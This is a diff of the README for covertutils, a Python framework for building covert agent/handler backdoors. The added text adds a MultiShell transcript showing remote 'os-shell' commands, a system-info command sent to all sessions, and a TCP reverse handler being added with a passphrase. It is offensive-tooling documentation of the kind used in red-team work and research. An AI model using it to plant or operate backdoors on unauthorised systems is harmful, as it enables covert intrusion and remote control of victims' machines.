@@ -11,11 +11,15 @@
 (DefCamp #8 | November 9-10)](https://def.camp/speaker/john-torakis/)
 
 ### What is it?
-This python package automatically handles all communication channel options, like **encryption**, **chunking**, **steganography**, etc.
+
+
+This Python package is used to create Agent/Handler backdoors, like *metasploit's* `meterpreter`, *empire's* `empire agent`, *cobalt strike's* `beacon` and so on...
+
+It automatically handles all communication channel options, like **encryption**, **chunking**, **steganography**, **sessions**, etc. [With a recent package addition (`httpimport`), staging from pure Python2/3 is finally possible!](http://covertutils.readthedocs.io/en/latest/staging_exec.html)
 
 With all those set with a few lines of code, a programmer can spend time creating the *actual payloads*, *persistense mechanisms*, *shellcodes* and generally **more creative stuff!**!
 
-The security programmers can stop *re-inventing the wheel* by implementing encryption mechanisms both agent-side and handler-side to spend their time to develop more versatile *agents*, and generally feature-full shells!
+The security programmers can stop *re-inventing the wheel* by implementing encryption mechanisms both Agent-side and Handler-side to spend their time developing more versatile *Agents*, and generally feature-rich shells!
 
 ### Python?
 Yes, python, and more specifically **Python2.7** only, for the time being...
@@ -24,6 +28,7 @@ Yes, python, and more specifically **Python2.7** only, for the time being...
 Several reasons. Mostly because Python2 is **more popular among devices** (*IoT devices*, *old Linux servers*, etc), and backdoor code could run *as-is* on them, without `Freezing`, `Packing`, `PyInstalling`, etc. Backdoors are valuable when they are as cross-platform as possible.
 Macs, for example, do not have Python3 installed by default. If you want `covertutils` in Python3, do not complain, read [this reddit flame war dodging](https://www.reddit.com/r/netsec/comments/6rj7b0/a_python_package_for_creating_backdoors_coverutils/) and start PRing...
 
+#### So far the `covertutils.crypto` subpackage has been ported to Python3. That means that all encryption and signing can work from Python3. Slow and steady...
 
 ### Dependencies?
 NO! Absolutely no dependencies, only pure python built-ins! The `entropy` package is required for the `tests` though.
@@ -101,6 +106,60 @@ Specifics:
 [!]	Quit shell? [y/N] y
 Aborted by the user...
 
+```
+
+### The `MultiShell`, handling multiple `Sessions`
+Care about *multiple session management*, with full abstraction of the transfer method?
+``` bash
+MultiShell> session -l
+	Current Sessions:
+0) 9cb04c9761938349 - <class '__main__.MyHandler'>
+System Info: N/A
+
+1) 523aff25b3703ac0 - <class '__main__.MyHandler'>
+System Info: N/A
+
+MultiShell> 523aff25b3703ac0 os-shell id
+'!os-shell id' -> <523aff25b3703ac0>
+uid=1000(unused) gid=1000(unused) groups=1000(unused)
+
+MultiShell> control sysinfo
+No sessions selected, ALL sessions will be commanded
+Are you sure? [y/N]: y
+'!control sysinfo' -> <9cb04c9761938349>
+'!control sysinfo' -> <523aff25b3703ac0>
+MultiShell> 
+[...]
+MultiShell> handler add examples/tcp_reverse_handler.py 8080 Pa55phra531
+MultiShell>
+Accepting			# non-blocking
+Accepted
+<covertutils.shells.impl.extendableshell.ExtendableShell instance at 0x7fe24c0e6dd0>
+Added Session!
+
+MultiShell> session -lv		# -v is verbose: shows available streams/extensions per handler
+	Current Sessions:
+0) 9cb04c9761938349 - <class '__main__.MyHandler'>
+hostname - Linux-4.12.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling - en_US-UTF-8 - unused
+	-> control
+	-> python
+	-> os-shell
+
+1) 0d415f6ba85c604d - <class 'MyHandler'>
+System Info: N/A
+	-> control
+	-> python
+	-> os-shell
+	-> file
+	-> stage
+
+2) 523aff25b3703ac0 - <class '__main__.MyHandler'>
+hostname - Linux-4.12.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling - en_US-UTF-8 - unused
+	-> control
+	-> python
+	-> os-shell
+
+MultiShell>
 ```
 
 ### The `Encryption Schemes`
